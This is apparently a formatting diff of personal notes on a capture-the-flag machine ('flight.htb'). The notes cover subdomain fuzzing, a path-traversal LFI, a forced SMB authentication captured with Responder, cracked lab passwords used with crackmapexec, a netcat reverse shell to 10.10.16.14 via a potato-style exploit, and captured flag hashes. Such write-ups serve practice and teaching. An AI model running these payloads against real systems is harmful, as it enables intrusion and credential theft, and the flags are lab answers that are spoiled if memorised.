@@ -1,26 +1,27 @@
 Getting access to the site
 
 ## subdomain enumeration
-	- user wfuzz
-	```bash
-	wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154
+- user wfuzz
+bash
+`wfuzz -c -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://flight.htb/" -H "Host: FUZZ.flight.htb" --hl 154`
 
-	```
-	- found school.flight.htb
-	- add both to the /etc/hosts
-		10.10.11.178     flight.htb   school.flight.htb
-	- check out the site, press random stuff
-	- Looks like local file inclusion is possible 
-		- ``http://school.flight.htb/index.php?view=../../../../../etc/passwd``
-		- But a site that says sus activity blocked
-		- Check out the php sourcecode (??!!!!?? IDK how the guy got the sourcecode...)
-		- bunch of stuff is blocked in url like .. filter \\ htaccess and shtml 
-		- but // is allowed
-		- This means smb is allowed --> force the server to fetch from a remote source
-		- //myip/sharename
+
+- found school.flight.htb
+- add both to the /etc/hosts
+	10.10.11.178     flight.htb   school.flight.htb
+- check out the site, press random stuff
+- Looks like local file inclusion is possible 
+	- http://school.flight.htb/index.php?view=../../../../../etc/passwd
+	- But a site that says sus activity blocked
+	- Check out the php sourcecode (??!!!!?? IDK how the guy got the sourcecode...)
+	- bunch of stuff is blocked in url like .. filter \\ htaccess and shtml 
+	- but // is allowed
+	- This means smb is allowed --> force the server to fetch from a remote source
+	- //myip/sharename
+
 
 On the website 
-```http://school.flight.htb/index.php?view=//myipaddress/test```
+`http://school.flight.htb/index.php?view=//myipaddress/test`
 
 On Attackers machine
 responder -I tun0 -wPv
@@ -38,7 +39,7 @@ SVC_APACHE::flight:8c0eafbdd12e31fd:e3a4c51868aef317982aabb15ce83935:01010000000
 
 ## Enumerate smb service
 
-crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
+`crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users`
 
 ```Results
 flight.htb\O.Possum                       badpwdcount: 3 baddpwdtime: 2023-02-17 09:34:18.605614      
@@ -95,11 +96,11 @@ c.bum password cracked
 Tikkycoll_431012284
 
 
-C:\Users\svc_apache\Desktop
+`C:\Users\svc_apache\Desktop`
 
 801e6a6abbb8f2744ce1e90644c20c91
 
-c:\users\c.bum\desktop\test.exe -t * -p "c:\users\c.bum\desktop\nc.exe" -a "10.10.16.14 9005 -e cmd.exe" -l 9003
+`c:\users\c.bum\desktop\test.exe -t * -p "c:\users\c.bum\desktop\nc.exe" -a "10.10.16.14 9005 -e cmd.exe" -l 9003`
 
 b90a5785e9d0a7bc49ba693ec58ccec3
 
